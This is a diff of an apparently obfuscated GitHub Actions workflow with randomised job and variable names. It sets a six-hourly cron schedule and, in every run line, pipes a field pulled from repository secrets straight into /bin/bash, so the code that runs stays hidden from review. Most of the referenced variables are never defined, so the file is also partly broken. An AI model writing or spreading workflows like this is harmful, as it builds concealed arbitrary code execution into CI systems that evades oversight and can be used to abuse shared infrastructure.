@@ -1,9 +1,8 @@
 name: dilongmai2376
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '15 5/6 * * *'
+    - cron: '28 3/6 * * *'
 
 jobs:
   build:
@@ -13,11 +12,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: dilongmai2376
         env:
-          pc5661: ${{ secrets.pc5661 }}
+          us6796: ${{ secrets.us6796 }}
         run: |
-          echo $pc5661 | jq -r .ba55433 | /bin/bash
-          echo $vr20 | jq -r .u31 | /bin/bash
-          echo $rj04 | jq -r .r20516 | /bin/bash
-          echo $xq41133 | jq -r .b135 | /bin/bash
-          echo $db76 | jq -r .fe732 | /bin/bash
+          echo $us6796 | jq -r .u88 | /bin/bash
+          echo $ojqxd90328 | jq -r .plr9 | /bin/bash
+          echo $ydybx454 | jq -r .eqem299 | /bin/bash
+          echo $frz81516 | jq -r .vwsw75736 | /bin/bash
+          echo $u105 | jq -r .iq3 | /bin/bash
+          echo $fzszk25671 | jq -r .ooltd6 | /bin/bash
+          echo $za6 | jq -r .lli41 | /bin/bash
+          echo $rk3747 | jq -r .kjhfv50136 | /bin/bash
+          echo $v91130 | jq -r .wxz06 | /bin/bash
+          echo $iqubc639 | jq -r .sdc6888 | /bin/bash
+          echo $iqm01410 | jq -r .iwl7131 | /bin/bash
 
